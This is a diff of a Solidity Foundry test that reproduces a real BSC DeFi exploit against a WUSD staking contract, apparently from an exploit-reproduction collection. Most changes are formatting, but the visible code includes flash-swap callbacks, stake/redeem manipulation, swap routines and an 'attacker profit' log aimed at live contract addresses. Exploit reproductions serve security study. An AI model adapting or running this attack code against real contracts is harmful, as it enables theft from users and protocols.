@@ -3,7 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
 import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
 import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
@@ -14,22 +14,22 @@ import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // https://bscscan.com/tx/0x31262f15a5b82999bf8d9d0f7e58dcb1656108e6031a2797b612216a95e1670e
 
 interface WUSDMASTER {
-
     function stake(uint256) external;
     function redeem(uint256) external;
     function maxStakeAmount() external;
-
 }
 
 contract ContractTest is Test {
-
     IERC20 WUSD = IERC20(0x3fF997eAeA488A082fb7Efc8e6B9951990D0c3aB);
     IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 WEX = IERC20(0xa9c41A46a6B3531d28d5c32F6633dd2fF05dFB90);
-    IUniswapV2Pair Pair1 = IUniswapV2Pair(0x6102D8A7C963F78D46a35a6218B0DB4845d1612F); // WUSD BUSD
-    IUniswapV2Pair Pair2 = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE); // WBNB USDT
-    IUniswapV2Router Router = IUniswapV2Router(payable(0xD48745E39BbED146eEC15b79cBF964884F9877c2)); // WS router
+    IUniswapV2Pair Pair1 =
+        IUniswapV2Pair(0x6102D8A7C963F78D46a35a6218B0DB4845d1612F); // WUSD BUSD
+    IUniswapV2Pair Pair2 =
+        IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE); // WBNB USDT
+    IUniswapV2Router Router =
+        IUniswapV2Router(payable(0xD48745E39BbED146eEC15b79cBF964884F9877c2)); // WS router
     WUSDMASTER Master = WUSDMASTER(0xa79Fe386B88FBee6e492EEb76Ec48517d1eC759a);
     uint256 Pair1Amount;
 
@@ -46,10 +46,19 @@ contract ContractTest is Test {
         WUSD.approve(address(Router), type(uint256).max);
         WUSDToBUSD();
 
-        emit log_named_decimal_uint("Attacker BUSD profit after exploit", BUSD.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "Attacker BUSD profit after exploit",
+            BUSD.balanceOf(address(this)),
+            18
+        );
     }
 
-    function waultSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+    function waultSwapCall(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) public {
         sender;
         amount0;
         amount1;
@@ -61,7 +70,12 @@ contract ContractTest is Test {
         WUSD.transfer(address(Pair1), (Pair1Amount * 10_000) / 9975 + 1000);
     }
 
-    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+    function pancakeCall(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) public {
         sender;
         amount0;
         amount1;
@@ -87,7 +101,11 @@ contract ContractTest is Test {
         path[0] = address(USDT);
         path[1] = address(WEX);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            23_000_000 * 1e18, 0, path, address(this), block.timestamp
+            23_000_000 * 1e18,
+            0,
+            path,
+            address(this),
+            block.timestamp
         );
     }
 
@@ -96,7 +114,11 @@ contract ContractTest is Test {
         path[0] = address(WEX);
         path[1] = address(USDT);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WEX.balanceOf(address(this)), 0, path, address(this), block.timestamp
+            WEX.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp
         );
     }
 
@@ -105,8 +127,11 @@ contract ContractTest is Test {
         path[0] = address(WUSD);
         path[1] = address(BUSD);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WUSD.balanceOf(address(this)), 0, path, address(this), block.timestamp
+            WUSD.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp
         );
     }
-
 }
